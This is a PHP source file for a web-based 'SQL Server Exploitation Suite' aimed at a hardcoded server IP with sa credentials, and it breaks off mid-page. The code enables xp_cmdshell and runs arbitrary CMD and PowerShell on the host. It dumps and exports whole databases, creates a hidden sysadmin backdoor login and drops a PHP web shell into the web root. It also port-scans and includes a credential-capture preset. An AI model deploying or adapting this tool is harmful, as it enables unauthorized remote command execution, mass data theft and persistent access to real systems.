<?php
/*
██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██║  ██║██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║███████║█████╗  ██████╔╝
██╔═══╝ ██╔══██╗██║   ██║██╔══██║██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╔╝██║  ██║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
COMPLETE SQL SERVER EXPLOITATION SUITE
With PowerShell & CMD RCE, Data Extraction, Persistence
*/
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// ================= CONFIGURATION =================
$config = [
    'server' => '196.188.169.49',
    'database' => 'E-CRMIS-2023-PRO-API',
    'username' => 'sa',
    'password' => 'p@55w0rd',
    'backup_dir' => 'C:\\bk\\',
];

// ================= HANDLE DATABASE SWITCHING FIRST =================
// Store selected database in session
if (isset($_POST['switch_database']) && isset($_POST['new_database']) && !empty($_POST['new_database'])) {
    $_SESSION['current_database'] = $_POST['new_database'];
} elseif (isset($_GET['db']) && !empty($_GET['db'])) {
    // Also allow database switching via URL parameter
    $_SESSION['current_database'] = $_GET['db'];
}

// Use session database if set, otherwise use default
$current_database = isset($_SESSION['current_database']) ? $_SESSION['current_database'] : $config['database'];

// ================= HANDLE EXPORTS (BEFORE ANY OUTPUT) =================

// Handle table export to CSV
if (isset($_POST['export_table'])) {
    try {
        $dsn = "sqlsrv:Server={$config['server']};Database={$current_database};TrustServerCertificate=1";
        $conn = new PDO($dsn, $config['username'], $config['password']);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $table = $_POST['export_table'];
        $limit = $_POST['limit'] ?? 0;
        $filename = str_replace(['[', ']', '.', ' '], '_', $table) . '_export_' . date('Ymd_His') . '.csv';
        
        $sql = $limit > 0 ? "SELECT TOP $limit * FROM $table" : "SELECT * FROM $table";
        $data = $conn->query($sql)->fetchAll(PDO::FETCH_ASSOC);
        
        if (!empty($data)) {
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="' . $filename . '"');
            
            $output = fopen('php://output', 'w');
            fputcsv($output, array_keys($data[0]));
            foreach ($data as $row) {
                fputcsv($output, $row);
            }
            fclose($output);
            exit;
        }
    } catch (Exception $e) {
        // Will continue to regular page with error
    }
}

// Handle query export to CSV
if (isset($_POST['export_query'])) {
    try {
        $dsn = "sqlsrv:Server={$config['server']};Database={$current_database};TrustServerCertificate=1";
        $conn = new PDO($dsn, $config['username'], $config['password']);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $query = base64_decode($_POST['export_query']);
        $filename = 'query_export_' . date('Ymd_His') . '.csv';
        
        $stmt = $conn->query($query);
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        if (!empty($data)) {
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="' . $filename . '"');
            
            $output = fopen('php://output', 'w');
            fputcsv($output, array_keys($data[0]));
            foreach ($data as $row) {
                fputcsv($output, $row);
            }
            fclose($output);
            exit;
        }
    } catch (Exception $e) {
        // Will continue to regular page with error
    }
}

// Handle bulk export (multiple CSV files in one download)
if (isset($_POST['export_all'])) {
    try {
        $dsn = "sqlsrv:Server={$config['server']};Database={$current_database};TrustServerCertificate=1";
        $conn = new PDO($dsn, $config['username'], $config['password']);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $tables = $conn->query("SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'")->fetchAll(PDO::FETCH_ASSOC);
        
        if (!empty($tables)) {
            $filename = 'export_all_' . date('Ymd_His') . '.txt';
            header('Content-Type: text/plain');
            header('Content-Disposition: attachment; filename="' . $filename . '"');
            
            foreach ($tables as $table) {
                $fullName = "[{$table['TABLE_SCHEMA']}].[{$table['TABLE_NAME']}]";
                echo "=== TABLE: {$fullName} ===\n\n";
                
                $data = $conn->query("SELECT * FROM $fullName")->fetchAll(PDO::FETCH_ASSOC);
                
                if (!empty($data)) {
                    $columns = array_keys($data[0]);
                    echo implode(',', $columns) . "\n";
                    foreach ($data as $row) {
                        echo implode(',', array_map(function($value) {
                            return '"' . str_replace('"', '""', $value) . '"';
                        }, $row)) . "\n";
                    }
                } else {
                    echo "Empty table\n";
                }
                echo "\n" . str_repeat('=', 50) . "\n\n";
            }
            exit;
        }
    } catch (Exception $e) {
        // Will continue to regular page with error
    }
}

// ================= DATABASE CONNECTION =================
try {
    $dsn = "sqlsrv:Server={$config['server']};Database={$current_database};TrustServerCertificate=1";
    $conn = new PDO($dsn, $config['username'], $config['password']);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $conn->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    
    $connection_success = true;
    $output_message = "<div style='background: #4CAF50; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px;'>";
    $output_message .= "✅ CONNECTED TO DATABASE: {$config['server']}@{$current_database} as {$config['username']}";
    $output_message .= "</div>";
    
} catch (Exception $e) {
    $connection_success = false;
    $output_message = "<div style='background: #f44336; color: white; padding: 15px; border-radius: 5px;'>";
    $output_message .= "❌ CONNECTION FAILED: " . $e->getMessage();
    $output_message .= "</div>";
    die($output_message);
}

// ================= STYLES & INITIAL JAVASCRIPT =================
?>
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>SQL Server Exploitation Suite</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .panel { background: white; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .panel-title { color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px; margin-top: 0; }
        .btn { background: #667eea; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #5a67d8; }
        .btn-danger { background: #f56565; }
        .btn-success { background: #48bb78; }
        .btn-warning { background: #ed8936; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th { background: #667eea; color: white; padding: 10px; text-align: left; }
        td { padding: 8px; border-bottom: 1px solid #ddd; }
        tr:hover { background: #f9f9f9; }
        .tab-container { display: flex; border-bottom: 1px solid #ddd; margin-bottom: 20px; flex-wrap: wrap; }
        .tab { padding: 10px 20px; cursor: pointer; border: 1px solid #ddd; border-bottom: none; background: #f9f9f9; white-space: nowrap; }
        .tab.active { background: white; font-weight: bold; border-top: 2px solid #667eea; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .command-output { background: #1a202c; color: #81e6d9; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; margin: 10px 0; }
        .status-success { color: #48bb78; font-weight: bold; }
        .status-error { color: #f56565; font-weight: bold; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .db-selector { background: #e2e8f0; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .output-container { max-height: 500px; overflow-y: auto; border: 1px solid #ddd; border-radius: 5px; padding: 10px; margin: 10px 0; }
        .export-notice { background: #e6fffa; border: 1px solid #81e6d9; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .db-quick-switch { margin-top: 10px; }
        .db-quick-switch a { display: inline-block; background: #c6f6d5; color: #22543d; padding: 3px 8px; margin: 2px; border-radius: 3px; text-decoration: none; font-size: 12px; }
        .db-quick-switch a:hover { background: #9ae6b4; }
    </style>
    <script>
    function switchTab(tabName) {
        // Hide all tabs
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelectorAll('.tab').forEach(tab => {
            tab.classList.remove('active');
        });
        
        // Show selected tab
        document.getElementById(tabName).classList.add('active');
        
        // Find and activate the clicked tab
        document.querySelectorAll('.tab').forEach(tab => {
            if (tab.getAttribute('data-tab') === tabName) {
                tab.classList.add('active');
            }
        });
    }
    
    // Initialize tabs on page load
    document.addEventListener('DOMContentLoaded', function() {
        // Check for hash in URL
        const hash = window.location.hash.substring(1);
        const validTabs = ['dashboard', 'os', 'data', 'persistence', 'sql', 'network'];
        
        // Also check for tab parameter in query string
        const urlParams = new URLSearchParams(window.location.search);
        const tabParam = urlParams.get('tab');
        
        let tabToShow = 'dashboard';
        
        if (hash && validTabs.includes(hash)) {
            tabToShow = hash;
        } else if (tabParam && validTabs.includes(tabParam)) {
            tabToShow = tabParam;
        }
        
        switchTab(tabToShow);
        
        // Add click handlers to tabs
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', function() {
                const tabName = this.getAttribute('data-tab');
                switchTab(tabName);
                // Update URL hash without reloading
                history.pushState(null, null, '#' + tabName);
            });
        });
        
        // Update database selector to show current selection
        const currentDb = '<?php echo addslashes($current_database); ?>';
        const dbSelect = document.querySelector('select[name="new_database"]');
        if (dbSelect) {
            dbSelect.value = currentDb;
        }
    });
    
    // Handle browser back/forward buttons
    window.addEventListener('hashchange', function() {
        const hash = window.location.hash.substring(1);
        const validTabs = ['dashboard', 'os', 'data', 'persistence', 'sql', 'network'];
        if (hash && validTabs.includes(hash)) {
            switchTab(hash);
        }
    });
    
    // Handle export forms - force download in same window
    document.addEventListener('DOMContentLoaded', function() {
        document.querySelectorAll('form[target="_blank"]').forEach(form => {
            form.target = '_self'; // Change to same window for downloads
        });
    });
    
    // Quick database switch
    function quickDbSwitch(dbName) {
        document.querySelector('select[name="new_database"]').value = dbName;
        document.querySelector('form [name="switch_database"]').click();
    }
    
    // Auto-scroll to output
    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(function() {
            const outputElements = document.querySelectorAll('.command-output, .output-container');
            outputElements.forEach(el => {
                if (el.textContent.trim().length > 0) {
                    el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                }
            });
        }, 100);
    });
    </script>
</head>
<body>
<?php

// ================= HTML INTERFACE =================
echo "
<div class='container'>
    <div class='header'>
        <h1>🚀 SQL SERVER EXPLOITATION SUITE</h1>
        <p>Target: {$config['server']} | Database: <strong>{$current_database}</strong> | User: {$config['username']}</p>
    </div>
    
    <div class='db-selector'>
        <form method='POST' style='display: inline-block;'>
            <select name='new_database' style='padding: 8px; margin-right: 10px;'>
                <option value=''>-- Select Database --</option>";
                
// Get all databases
try {
    $databases = $conn->query("SELECT name FROM sys.databases WHERE state = 0 ORDER BY name")->fetchAll(PDO::FETCH_COLUMN, 0);
    foreach ($databases as $db) {
        $selected = ($db == $current_database) ? 'selected' : '';
        echo "<option value='$db' $selected>$db</option>";
    }
} catch (Exception $e) {
    echo "<option>Error loading databases</option>";
}

echo "
            </select>
            <button type='submit' name='switch_database' class='btn'>Switch Database</button>
            <button type='button' onclick=\"document.querySelector('select[name=\\'new_database\\']').value=''; document.querySelector('form [name=\\'switch_database\\']').click();\" class='btn btn-warning'>Reset to Default</button>
        </form>
        <span style='margin-left: 20px; color: #666;'>
            Currently connected to: <strong>{$current_database}</strong>
        </span>
        
        <div class='db-quick-switch'>
            <strong>Quick switch:</strong> ";
try {
    $databases = $conn->query("SELECT name FROM sys.databases WHERE state = 0 ORDER BY name")->fetchAll(PDO::FETCH_COLUMN, 0);
    foreach ($databases as $db) {
        if ($db != $current_database) {
            echo "<a href='javascript:void(0)' onclick=\"quickDbSwitch('$db')\">$db</a> ";
        }
    }
} catch (Exception $e) {
    echo "<span style='color: #f56565;'>Error loading databases</span>";
}
echo "
        </div>
    </div>
    
    " . $output_message . "
    
    <div class='tab-container'>
        <div class='tab active' data-tab='dashboard'>📊 Dashboard</div>
        <div class='tab' data-tab='os'>⚡ OS Command Execution</div>
        <div class='tab' data-tab='data'>💾 Data Extraction</div>
        <div class='tab' data-tab='persistence'>🔑 Persistence</div>
        <div class='tab' data-tab='sql'>🔧 SQL Query</div>
        <div class='tab' data-tab='network'>🌐 Network Recon</div>
    </div>
";

// ================= DASHBOARD TAB =================
echo "<div id='dashboard' class='tab-content active'>";
echo "<h2 class='panel-title'>📊 System Overview</h2>";

// Get system info
try {
    $systemInfo = $conn->query("
        SELECT 
            @@VERSION as sql_version,
            @@SERVERNAME as server_name,
            DB_NAME() as current_db,
            CURRENT_USER as [current_user],
            IS_SRVROLEMEMBER('sysadmin') as is_sysadmin,
            (SELECT COUNT(*) FROM sys.databases) as db_count,
            (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE') as table_count
    ")->fetch();

    echo "<div class='grid'>";
    foreach ($systemInfo as $key => $value) {
        $icon = match($key) {
            'is_sysadmin' => $value ? '✅' : '❌',
            'sql_version' => '🛠️',
            'server_name' => '🖥️',
            'current_db' => '🗄️',
            'current_user' => '👤',
            'db_count' => '📚',
            'table_count' => '📊',
            default => '📝'
        };
        
        if ($key == 'is_sysadmin') {
            $value = $value ? 'SYSTEM ADMINISTRATOR' : 'Limited User';
            $color = $value ? 'status-success' : 'status-error';
        } else {
            $color = '';
        }
        
        echo "<div class='panel'>
                <h3>$icon " . str_replace('_', ' ', ucfirst($key)) . "</h3>
                <p class='$color'>" . htmlspecialchars($value) . "</p>
              </div>";
    }
    echo "</div>";

    // Check xp_cmdshell status
    $xpStatus = $conn->query("EXEC sp_configure 'xp_cmdshell'")->fetchAll();
    $xpEnabled = $xpStatus[0]['run_value'] ?? 0;
    
    echo "<div class='panel'>";
    echo "<h3>⚡ xp_cmdshell Status: " . ($xpEnabled ? '<span class="status-success">ENABLED</span>' : '<span class="status-error">DISABLED</span>') . "</h3>";
    if (!$xpEnabled) {
        echo "<form method='POST' style='display: inline;'>
                <input type='hidden' name='action' value='enable_xp'>
                <button type='submit' class='btn btn-success'>Enable xp_cmdshell</button>
              </form>";
    }
    echo "</div>";

} catch (Exception $e) {
    echo "<div class='panel'><p class='status-error'>Error getting system info: " . $e->getMessage() . "</p></div>";
}

echo "</div>";

// ================= OS COMMAND EXECUTION TAB =================
echo "<div id='os' class='tab-content'>";
echo "<h2 class='panel-title'>⚡ Operating System Command Execution</h2>";

// Display output if command was executed
if (isset($_POST['execute_cmd']) && isset($_POST['cmd_type'])) {
    $command = $_POST['command'];
    $type = $_POST['cmd_type'];
    
    echo "<div class='panel'>";
    echo "<h3>Executing: " . htmlspecialchars($command) . " ($type)</h3>";
    
    try {
        if ($type == 'cmd') {
            $sql = "EXEC xp_cmdshell '{$command}'";
        } else {
            // PowerShell command
            $command = addslashes($command);
            $sql = "EXEC xp_cmdshell 'powershell -Command \"{$command}\"'";
        }
        
        $stmt = $conn->query($sql);
        $output = $stmt->fetchAll(PDO::FETCH_COLUMN, 0);
        
        echo "<div class='command-output'>";
        foreach ($output as $line) {
            if ($line !== null && trim($line) !== '') {
                echo htmlspecialchars($line) . "\n";
            }
        }
        echo "</div>";
        
    } catch (Exception $e) {
        echo "<p class='status-error'>Execution failed: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

// Preset commands
$presetCommands = [
    'cmd' => [
        'whoami' => 'Current user context',
        'systeminfo' => 'System information',
        'net user' => 'List local users',
        'net localgroup administrators' => 'List administrators',
        'ipconfig /all' => 'Network configuration',
        'netstat -ano' => 'Active connections',
        'dir C:\\' => 'Root directory listing',
        'tasklist' => 'Running processes',
        'sc query' => 'List services',
        'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"' => 'Auto-start programs',
    ],
    'powershell' => [
        'Get-Process | Select Name, Id, CPU' => 'Get processes',
        'Get-Service | Where Status -eq "Running"' => 'Running services',
        'Get-WmiObject Win32_UserAccount' => 'All user accounts',
        'Get-WmiObject Win32_Product | Select Name, Version' => 'Installed software',
        'Get-NetTCPConnection -State Listen' => 'Listening ports',
        'Get-WmiObject Win32_NetworkAdapterConfiguration | Where IPEnabled -eq True' => 'Network config',
        'Get-ChildItem "C:\\Users\\" -Directory' => 'User directories',
        'Get-EventLog -LogName Security -Newest 10' => 'Security logs',
        'Get-WmiObject Win32_LogicalDisk' => 'Disk information',
        '$cred = Get-Credential; $cred.GetNetworkCredential().Password' => 'Test credential capture',
    ]
];

echo "<div class='grid'>";
foreach ($presetCommands as $type => $commands) {
    echo "<div class='panel'>";
    echo "<h3>" . ($type == 'cmd' ? '🖥️ CMD' : '🔷 PowerShell') . " Preset Commands</h3>";
    
    foreach ($commands as $cmd => $desc) {
        echo "<form method='POST' style='margin-bottom: 10px;'>
                <input type='hidden' name='command' value='" . htmlspecialchars($cmd) . "'>
                <input type='hidden' name='cmd_type' value='$type'>
                <button type='submit' name='execute_cmd' class='btn'>$desc</button>
              </form>";
    }
    echo "</div>";
}
echo "</div>";

// Custom command execution
echo "<div class='panel'>";
echo "<h3>🎯 Custom Command Execution</h3>";
echo "<form method='POST'>
        <select name='cmd_type' style='padding: 10px; margin: 10px 0;'>
            <option value='cmd'>CMD Command</option>
            <option value='powershell'>PowerShell Command</option>
        </select><br>
        <textarea name='command' rows='4' style='width: 100%; padding: 10px;' placeholder='Enter command...'></textarea><br>
        <button type='submit' name='execute_cmd' class='btn btn-success'>Execute Command</button>
      </form>";
echo "</div>";
echo "</div>";

// ================= DATA EXTRACTION TAB =================
echo "<div id='data' class='tab-content'>";
echo "<h2 class='panel-title'>💾 Data Extraction & Exfiltration</h2>";

// Display export notice
echo "<div class='export-notice'>
        <strong>📥 Export Note:</strong> Clicking export buttons will download files directly to your computer. 
        For large tables, the download may take a moment to start.
        <br><strong>Current Database:</strong> {$current_database}
      </div>";

// Handle table dump display
if (isset($_GET['action']) && $_GET['action'] == 'dump_table') {
    $table = $_GET['table'];
    $limit = $_GET['limit'] ?? 100;
    
    echo "<div class='panel'>";
    echo "<h3>Dumping table: $table (Database: {$current_database})</h3>";
    
    try {
        $data = $conn->query("SELECT TOP $limit * FROM $table")->fetchAll();
        $columns = $data ? array_keys($data[0]) : [];
        
        if (!empty($data)) {
            echo "<div class='output-container'>";
            echo "<table>";
            echo "<tr>";
            foreach ($columns as $col) {
                echo "<th>$col</th>";
            }
            echo "</tr>";
            
            foreach ($data as $row) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars(substr($value, 0, 100)) . "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
            echo "</div>";
            
            // Export button - NO target attribute, will download in same window
            echo "<form method='POST'>
                    <input type='hidden' name='export_table' value='$table'>
                    <input type='hidden' name='limit' value='$limit'>
                    <button type='submit' class='btn btn-success'>📥 Export to CSV</button>
                  </form>";
        } else {
            echo "<p>Table is empty</p>";
        }
    } catch (Exception $e) {
        echo "<p class='status-error'>Error: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

// Get all tables
try {
    $tables = $conn->query("
        SELECT 
            TABLE_SCHEMA,
            TABLE_NAME,
            (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS c 
             WHERE c.TABLE_SCHEMA = t.TABLE_SCHEMA AND c.TABLE_NAME = t.TABLE_NAME) as column_count
        FROM INFORMATION_SCHEMA.TABLES t
        WHERE TABLE_TYPE = 'BASE TABLE'
        ORDER BY TABLE_SCHEMA, TABLE_NAME
    ")->fetchAll();

    echo "<div class='panel'>";
    echo "<h3>📋 Database Tables in '{$current_database}' (" . count($tables) . ")</h3>";
    echo "<div class='output-container'>";
    echo "<table>";
    echo "<tr><th>Schema</th><th>Table</th><th>Columns</th><th>Actions</th></tr>";
    
    foreach ($tables as $table) {
        $fullName = "[{$table['TABLE_SCHEMA']}].[{$table['TABLE_NAME']}]";
        echo "<tr>";
        echo "<td>{$table['TABLE_SCHEMA']}</td>";
        echo "<td><strong>{$table['TABLE_NAME']}</strong></td>";
        echo "<td>{$table['column_count']}</td>";
        echo "<td>
                <a href='?tab=data&action=dump_table&table=" . urlencode($fullName) . "&limit=50' class='btn'>View</a>
                <a href='?tab=data&action=dump_table&table=" . urlencode($fullName) . "&limit=1000' class='btn'>Dump 1000</a>
              </td>";
        echo "</tr>";
    }
    echo "</table>";
    echo "</div>";
    
    // Bulk export form - NO target attribute
    echo "<form method='POST' style='margin-top: 20px;'>
            <button type='submit' name='export_all' class='btn btn-success'>📥 Export ALL Tables (Combined TXT)</button>
            <small style='display: block; margin-top: 5px; color: #666;'>All tables from '{$current_database}' will be combined into a single text file with CSV sections</small>
          </form>";
    
    echo "</div>";

} catch (Exception $e) {
    echo "<div class='panel'><p class='status-error'>Error listing tables: " . $e->getMessage() . "</p></div>";
}

echo "</div>";

// ================= PERSISTENCE TAB =================
echo "<div id='persistence' class='tab-content'>";
echo "<h2 class='panel-title'>🔑 Persistence & Backdoor Creation</h2>";

// Display results on same page
if (isset($_POST['create_backdoor'])) {
    echo "<div class='panel'>";
    
    try {
        $backdoorUser = $_POST['backdoor_user'] ?? 'svc_sql_' . rand(1000, 9999);
        $backdoorPass = $_POST['backdoor_pass'] ?? 'P@ssw0rd' . rand(100, 999);
        
        $conn->exec("CREATE LOGIN [$backdoorUser] WITH PASSWORD = '$backdoorPass', CHECK_POLICY = OFF");
        $conn->exec("ALTER SERVER ROLE sysadmin ADD MEMBER [$backdoorUser]");
        
        echo "<h3>✅ Backdoor Created Successfully</h3>";
        echo "<div class='command-output'>";
        echo "Username: $backdoorUser\n";
        echo "Password: $backdoorPass\n";
        echo "Privileges: SYSTEM ADMINISTRATOR\n";
        echo "Connection String: Data Source={$config['server']};Initial Catalog={$current_database};User ID=$backdoorUser;Password=$backdoorPass;TrustServerCertificate=True\n";
        echo "</div>";
        
    } catch (Exception $e) {
        echo "<p class='status-error'>Failed to create backdoor: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

if (isset($_POST['action']) && $_POST['action'] == 'enable_xp') {
    echo "<div class='panel'>";
    
    try {
        $conn->exec("EXEC sp_configure 'show advanced options', 1; RECONFIGURE");
        $conn->exec("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE");
        
        echo "<h3>✅ xp_cmdshell Enabled</h3>";
        echo "<p>OS command execution is now available through xp_cmdshell.</p>";
        
    } catch (Exception $e) {
        echo "<p class='status-error'>Failed to enable xp_cmdshell: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

if (isset($_POST['create_webshell'])) {
    echo "<div class='panel'>";
    
    try {
        $webShell = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}?>';
        $webShell .= '<?php if(isset($_POST["pwsh"])){echo shell_exec("powershell -Command \"" . $_POST["pwsh"] . "\"");}?>';
        
        $conn->query("EXEC xp_cmdshell 'echo $webShell > C:\\inetpub\\wwwroot\\shell.php'");
        
        echo "<h3>✅ Web Shell Created</h3>";
        echo "<p>Web shell accessible at: http://{$config['server']}/shell.php</p>";
        echo "<div class='command-output'>";
        echo "CMD: http://{$config['server']}/shell.php?cmd=whoami\n";
        echo "PowerShell: POST to http://{$config['server']}/shell.php with parameter 'pwsh'\n";
        echo "</div>";
        
    } catch (Exception $e) {
        echo "<p class='status-error'>Failed to create web shell: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

echo "<div class='grid'>";

echo "<div class='panel'>";
echo "<h3>👤 Create Hidden Admin Account</h3>";
echo "<form method='POST'>
        <input type='text' name='backdoor_user' placeholder='Username (optional)' style='width: 100%; padding: 8px; margin: 5px 0;'><br>
        <input type='text' name='backdoor_pass' placeholder='Password (optional)' style='width: 100%; padding: 8px; margin: 5px 0;'><br>
        <button type='submit' name='create_backdoor' class='btn btn-danger'>Create Backdoor Login</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>⚡ Enable xp_cmdshell</h3>";
echo "<p>Required for OS command execution</p>";
echo "<form method='POST'>
        <input type='hidden' name='action' value='enable_xp'>
        <button type='submit' class='btn btn-warning'>Enable xp_cmdshell</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>🕸️ Create Web Shell</h3>";
echo "<p>Deploy PHP web shell on server</p>";
echo "<form method='POST'>
        <button type='submit' name='create_webshell' class='btn'>Deploy Web Shell</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>💾 Database Backup</h3>";
echo "<form method='POST'>
        <input type='hidden' name='action' value='backup_db'>
        <button type='submit' class='btn'>Create Full Backup</button>
      </form>";
echo "</div>";

echo "</div>";
echo "</div>";

// ================= SQL QUERY TAB =================
echo "<div id='sql' class='tab-content'>";
echo "<h2 class='panel-title'>🔧 SQL Query Executor</h2>";

if (isset($_POST['execute_sql'])) {
    $query = $_POST['sql_query'];
    
    echo "<div class='panel'>";
    echo "<h3>Executing Query in '{$current_database}':</h3>";
    echo "<div class='command-output'>" . htmlspecialchars($query) . "</div>";
    
    try {
        $stmt = $conn->query($query);
        
        if ($stmt->columnCount() > 0) {
            $data = $stmt->fetchAll();
            
            if (!empty($data)) {
                echo "<h4>Results (" . count($data) . " rows):</h4>";
                echo "<div class='output-container'>";
                echo "<table>";
                echo "<tr>";
                foreach (array_keys($data[0]) as $col) {
                    echo "<th>$col</th>";
                }
                echo "</tr>";
                
                $count = 0;
                foreach ($data as $row) {
                    if ($count++ > 100) {
                        echo "<tr><td colspan='" . count($row) . "'>... and " . (count($data) - 100) . " more rows</td></tr>";
                        break;
                    }
                    echo "<tr>";
                    foreach ($row as $value) {
                        echo "<td>" . htmlspecialchars(substr($value, 0, 200)) . "</td>";
                    }
                    echo "</tr>";
                }
                echo "</table>";
                echo "</div>";
                
                // Export button - NO target attribute
                echo "<form method='POST' style='margin-top: 10px;'>
                        <input type='hidden' name='export_query' value='" . base64_encode($query) . "'>
                        <button type='submit' class='btn btn-success'>📥 Export Results to CSV</button>
                      </form>";
            } else {
                echo "<p>Query executed successfully (no rows returned)</p>";
            }
        } else {
            $affected = $stmt->rowCount();
            echo "<p>Query executed successfully. Rows affected: $affected</p>";
        }
        
    } catch (Exception $e) {
        echo "<p class='status-error'>Query failed: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

echo "<div class='panel'>";
echo "<h3>Enter SQL Query (Current Database: '{$current_database}')</h3>";
echo "<form method='POST'>
        <textarea name='sql_query' rows='8' style='width: 100%; padding: 10px; font-family: monospace;' 
                  placeholder='SELECT * FROM Users...'>" . ($_POST['sql_query'] ?? '') . "</textarea><br>
        <button type='submit' name='execute_sql' class='btn btn-success'>Execute Query</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>📝 Quick Query Templates</h3>";
echo "<div class='grid'>";

$quickQueries = [
    'User Data' => [
        "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%'" => 'Find user tables',
        "SELECT * FROM sys.sql_logins" => 'List SQL logins',
        "SELECT name, type_desc, is_disabled FROM sys.server_principals" => 'All server principals',
    ],
    'System Info' => [
        "SELECT * FROM sys.databases" => 'List all databases',
        "EXEC sp_helpdb" => 'Database details',
        "SELECT * FROM sys.configurations ORDER BY name" => 'SQL Server configurations',
    ],
    'Security' => [
        "SELECT * FROM sys.dm_exec_sessions" => 'Active sessions',
        "SELECT * FROM sys.dm_exec_connections" => 'Active connections',
        "SELECT * FROM sys.dm_exec_requests" => 'Current requests',
    ]
];

foreach ($quickQueries as $category => $queries) {
    echo "<div>";
    echo "<h4>$category</h4>";
    foreach ($queries as $query => $desc) {
        echo "<form method='POST' style='margin-bottom: 5px;'>
                <input type='hidden' name='sql_query' value='" . htmlspecialchars($query) . "'>
                <button type='submit' name='execute_sql' class='btn' style='width: 100%; text-align: left;'>$desc</button>
              </form>";
    }
    echo "</div>";
}

echo "</div>";
echo "</div>";
echo "</div>";

// ================= NETWORK RECON TAB =================
echo "<div id='network' class='tab-content'>";
echo "<h2 class='panel-title'>🌐 Network Reconnaissance</h2>";

if (isset($_POST['network_scan'])) {
    $target = $_POST['scan_target'] ?? 'localhost';
    
    echo "<div class='panel'>";
    echo "<h3>Scanning: $target</h3>";
    
    try {
        $ports = "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1434,1723,3306,3389,5432,5900,8080,8443";
        $command = "powershell \"1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect('$target', \$_)) \\\"\$target:\\$_ is open\\\"} 2>\\\$null\"";
        
        $sql = "EXEC xp_cmdshell '{$command}'";
        $stmt = $conn->query($sql);
        $output = $stmt->fetchAll(PDO::FETCH_COLUMN, 0);
        
        echo "<div class='command-output'>";
        foreach ($output as $line) {
            if ($line && stripos($line, 'open') !== false) {
                echo htmlspecialchars($line) . "\n";
            }
        }
        echo "</div>";
        
    } catch (Exception $e) {
        echo "<p class='status-error'>Scan failed: " . $e->getMessage() . "</p>";
    }
    echo "</div>";
}

echo "<div class='grid'>";

echo "<div class='panel'>";
echo "<h3>🔍 Port Scanner</h3>";
echo "<form method='POST'>
        <input type='text' name='scan_target' placeholder='IP or hostname' value='localhost' style='width: 100%; padding: 8px; margin: 5px 0;'><br>
        <button type='submit' name='network_scan' class='btn'>Scan Common Ports</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>🌐 Network Information</h3>";
echo "<form method='POST'>
        <input type='hidden' name='command' value='ipconfig /all && arp -a && netstat -ano'>
        <input type='hidden' name='cmd_type' value='cmd'>
        <button type='submit' name='execute_cmd' class='btn'>Get Network Info</button>
      </form>";
echo "</div>";

echo "<div class='panel'>";
echo "<h3>👥 Active Directory</h3>";
